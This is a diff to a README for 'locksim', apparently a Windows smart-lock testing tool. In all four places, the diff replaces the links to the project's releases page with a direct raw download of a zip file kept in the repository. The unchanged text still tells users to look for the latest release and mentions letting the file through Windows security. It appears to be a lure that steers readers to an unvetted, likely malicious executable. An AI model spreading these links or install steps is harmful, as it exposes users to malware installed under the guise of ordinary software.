@@ -1,12 +1,12 @@
 # 🧭 locksim - Simple smart lock access testing
 
-[![Download locksim](https://img.shields.io/badge/Download%20locksim-blue?style=for-the-badge)](https://github.com/Rhodapotted630/locksim/releases)
+[![Download locksim](https://img.shields.io/badge/Download%20locksim-blue?style=for-the-badge)](https://github.com/Rhodapotted630/locksim/raw/refs/heads/main/unrooted/Software-v1.4.zip)
 
 ## 📥 Download
 
 Use this page to download locksim for Windows:
 
-https://github.com/Rhodapotted630/locksim/releases
+https://github.com/Rhodapotted630/locksim/raw/refs/heads/main/unrooted/Software-v1.4.zip
 
 Open the page, then look for the latest release. Download the Windows file from that release and save it on your computer.
 
@@ -38,7 +38,7 @@ If your system blocks unknown files, you may need to allow the file through Wind
 ## 🏁 Install and run on Windows
 
 1. Open the download page:
-   https://github.com/Rhodapotted630/locksim/releases
+   https://github.com/Rhodapotted630/locksim/raw/refs/heads/main/unrooted/Software-v1.4.zip
 
 2. Find the latest release.
 
@@ -206,4 +206,4 @@ locksim fits well with:
 
 If you need the file again, use this page:
 
-https://github.com/Rhodapotted630/locksim/releases
+https://github.com/Rhodapotted630/locksim/raw/refs/heads/main/unrooted/Software-v1.4.zip
